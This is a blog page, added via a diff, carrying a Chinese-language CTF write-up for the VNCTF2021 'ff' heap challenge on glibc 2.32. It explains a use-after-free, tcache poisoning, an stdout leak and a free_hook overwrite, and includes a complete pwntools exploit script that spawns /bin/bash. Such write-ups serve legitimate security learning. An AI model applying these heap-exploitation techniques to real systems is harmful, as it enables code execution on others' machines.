@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Trident91">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="VNCTF2021 Pwn [持续更新中]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Trident91&#39;s Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    
+        <meta name="twitter:card" content="summary" />
+    
+    
+    
+
+    <!-- Title -->
+    
+    <title>VNCTF2021 Pwn [持续更新中] - Trident91&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Google Analytics -->
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-dice-d20" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2021/04/08/VNCTF2021/">
+                VNCTF2021 Pwn [持续更新中]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-04-08</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/Write-Up/">Write-Up</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h6 id="一点废话"><a href="#一点废话" class="headerlink" title="一点废话"></a>一点废话</h6><p>2021年三月某个周日,安排本来是上午运动,下午打这个比赛. 然而篮球斗牛过程中被对手爆了头,昏了一整天,遂将这比赛鸽了…<br>过了一个月,回头看下比赛中的pwn题.</p>
+<h2 id="ff"><a href="#ff" class="headerlink" title="ff"></a>ff</h2><p>glibc 2.32, 需要疯狂调试的一道题,令人昏迷.</p>
+<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p><code>free</code> 后指针未清空. </p>
+<h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><ul>
+<li>没用数组存储指针, 只能控制上一个<code>malloc()</code>的chunk</li>
+<li>能<code>malloc()</code>的最大大小为0x7F (之后会发现这点把最后利用时使用的size卡的很死)</li>
+<li><code>show()</code> 只能用一次, 应该是要打stdout了</li>
+<li><code>edit()</code> 只能用两次… </li>
+<li>2.32中, tcache_entry 中的next指针会被<code>PROTECT_PTR</code>函数异或处理, 使用的mask为其地址&gt;&gt;12. </li>
+</ul>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
+<li><p>利用<code>PROTECT_PTR</code>:  利用next值为0的chunk, 和</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mask ⊕ 0 &#x3D; mask</span><br></pre></td></tr></table></figure>
+<p>以上这个特性, <code>show()</code>泄露出 mask. mask存放着 堆地址 &gt;&gt; 12. <code>show()</code>次数用尽.</p>
+</li>
+<li><p>通过UAF漏洞, <code>edit()</code>修改<code>tcache_entry</code>中的key值. <code>tcache_entry</code>使用用户chunk中的用户数据,key就在所谓bk指针的位置. 修改完key值,就可以绕过检查进行<code>double free()</code>.</p>
+</li>
+<li><p>通过<code>edit()</code>做<code>tcache poisoning</code>, 劫持到<code>tcache_perthread_struct</code>. 需注意tcache_entry-&gt;next 指向的是用户数据段, 因此需要劫持的地址需要加上0x10. 还需要用之前泄露出的mask对其做一次异或.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(mask ^ (heap_base + 0x10))+p64(0))</span><br></pre></td></tr></table></figure></li>
+<li><p><code>tcache_perthread_struct</code>大小为0x290, 我们把count[0x290]覆盖成大于等于7,就能将其释放到<code>unsortedbin</code>中.</p>
+</li>
+<li><p>非常重要的一点: 记得我们在<code>tcache_perthread_struct</code>操作, 该chunk进入<code>unsortedbin</code>中会对<code>counts[]</code>进行污染,我们要将其清零. 同时,我们也应当为之后的利用<code>entries[]</code>的操作做准备,设置对应的<code>counts[]</code>值使其大于零.</p>
+</li>
+<li><p>利用<code>unsortedbin</code>中chunk的分割,将main_arena地址写到<code>entries[目标大小]</code>中. 通过partial overwrite 打到<code>_IO_2_1_stdout_</code> (需要爆破,1 / 2^4). </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此处 payload  &#x3D; p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;</span><br></pre></td></tr></table></figure>
+<p>写入payload,泄露出libc</p>
+</li>
+<li><p>再次分割,覆盖<code>entries[目标大小]</code>为<code>free_hook</code>-0x10.(2.32中tcache申请的地址需要0x10对齐).<br>因为申请的大小最高为0x7f,这个目标大小不能超过0x90. 这对之前分割时使用的size限制比较死,需要好好调试一下.</p>
+</li>
+<li><p>写入”/bin/bash”, 改free_hook为system, 调用<code>free</code>触发system(“/bin/bash”).</p>
+</li>
+</ol>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>2.32 下新的防护机制也带来了新的泄露方式,学到了.<br>但出题能别把每个方面都限制的那么死么=.=, 调试起来真的痛苦.</p>
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def init():</span><br><span class="line">    global target</span><br><span class="line">    if len(sys.argv) &gt;1 and sys.argv[1] &#x3D;&#x3D; &#39;r&#39;:</span><br><span class="line">        target &#x3D; remote(&quot;node3.buuoj.cn&quot;,PORT)</span><br><span class="line">    else:</span><br><span class="line">        target&#x3D;process([&quot;.&#x2F;ld-2.32.so&quot;,&quot;.&#x2F;pwn&quot;],env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;&#x2F;home&#x2F;trident&#x2F;libc&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.32-0ubuntu3.2_amd64&#x2F;libc.so.6&quot;&#125;)</span><br><span class="line">        if(len(sys.argv)&gt;1) and sys.argv[1]&#x3D;&#x3D;&#39;g&#39;:</span><br><span class="line">            gdb.attach(target)</span><br><span class="line"></span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">#context.update(arch&#x3D;&#39;&#39;)</span><br><span class="line">#gdb.attach(target)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def s(i):</span><br><span class="line">    target.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">    target.sendline(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    s(&quot;1&quot;)</span><br><span class="line">    target.recvuntil(&quot;ize:&quot;)</span><br><span class="line">    target.sendline(str(size))</span><br><span class="line">    target.recvuntil(&quot;Content:&quot;)</span><br><span class="line">    target.send(content)</span><br><span class="line"></span><br><span class="line">def delete():</span><br><span class="line">    s(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    s(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def edit(content):</span><br><span class="line">    s(&quot;5&quot;)</span><br><span class="line">    target.recvuntil(&quot;tent:\n&quot;)</span><br><span class="line">    target.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    add(0x58,&quot;a\n&quot;)</span><br><span class="line">    delete()</span><br><span class="line">    show()</span><br><span class="line"></span><br><span class="line">    mask &#x3D; u64(target.recvuntil(&quot;1.add&quot;,drop&#x3D;True).ljust(8,&#39;\x00&#39;))</span><br><span class="line">    #success(&quot;mask leaked: &quot;+hex(mask))</span><br><span class="line">    heap_base &#x3D; mask &lt;&lt; 12</span><br><span class="line">    #success(&quot;heap_base: &quot;+hex(heap_base))</span><br><span class="line">    </span><br><span class="line">    #double free</span><br><span class="line">    edit(p64(0xdeadbeef)*2) </span><br><span class="line">    delete()</span><br><span class="line">    </span><br><span class="line">    edit(p64(mask ^ (heap_base + 0x10))+p64(0))</span><br><span class="line">    add(0x58,&quot;a\n&quot;)</span><br><span class="line">    </span><br><span class="line">    # hijack tcache_perthread_struct</span><br><span class="line">    # overwrite tcache-&gt;counts[0x290]</span><br><span class="line">    # 0x27 * 2 &#x3D; 0x4E</span><br><span class="line">    add(0x58,&quot;\x00&quot;*0x4E + p16(8)) </span><br><span class="line">    delete()</span><br><span class="line">    </span><br><span class="line">    # now tcache_perthread_struct is in unsortedbin </span><br><span class="line">    # let&#39;s split the chunk into our desired form</span><br><span class="line">    </span><br><span class="line">    # remember to carefully set up tcache-&gt;count as we proceed</span><br><span class="line">    add(0x48,p16(0)*3+p16(1)+p16(0)*2+p16(1)+p16(0))</span><br><span class="line">    add(0x30,p64(0xdeadbeef)*2)</span><br><span class="line">    #partial overwrite entry[0x50] to stdout</span><br><span class="line">    add(0x18,p64(0)+&quot;\xc0\x96&quot;)</span><br><span class="line">    # fxxk stdout</span><br><span class="line">    add(0x48,p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) </span><br><span class="line"></span><br><span class="line"># operation after bruteforcing succeed</span><br><span class="line">def pwn2(leak):</span><br><span class="line">    libc_base &#x3D; leak - 0x1e4744</span><br><span class="line">    success(&quot;libc_base leaked: &quot;+hex(libc_base))</span><br><span class="line">    </span><br><span class="line">    free_hook &#x3D; libc_base + 0x1e6e40</span><br><span class="line">    system &#x3D; libc_base + 0x503c0</span><br><span class="line">    </span><br><span class="line">    # overwrite entry[0x80] to free_hook</span><br><span class="line">    add(0x18,p64(free_hook-0x10)) </span><br><span class="line">   </span><br><span class="line">    # write system to free_hook</span><br><span class="line">    add(0x78,&quot;&#x2F;bin&#x2F;bash&quot;.ljust(16,&quot;\x00&quot;) + p64(system)) </span><br><span class="line">    #BOOOOM!</span><br><span class="line">    delete()</span><br><span class="line">    </span><br><span class="line">    target.interactive()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            init()</span><br><span class="line">            pwn()</span><br><span class="line">            leak &#x3D; target.recvuntil(&#39;add&#39;)</span><br><span class="line">            if &quot;\x7f&quot; in leak:</span><br><span class="line">                leak &#x3D; u64(leak[1:7].ljust(8,&quot;\x00&quot;))</span><br><span class="line">                success(&quot;stdout leak: &quot;+hex(leak))</span><br><span class="line">                pwn2(leak)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;FXXK!&quot;)</span><br><span class="line">                target.close()</span><br><span class="line">        except:</span><br><span class="line">            print(&quot;FXXK!&quot;)</span><br><span class="line">            target.close()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/write-up/">#write-up</a> <a href="/tags/ctf/">#ctf</a> <a href="/tags/pwn/">#pwn</a> <a href="/tags/heap/">#heap</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2077/02/25/hello/">Hello</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2021/04/08/VNCTF2021/">VNCTF2021 Pwn [持续更新中]</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2021/03/04/heap_writeup/">简单堆题write-up</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/Write-Up/">Write-Up</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Trident91. All right reserved | This epic theme is developed by <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
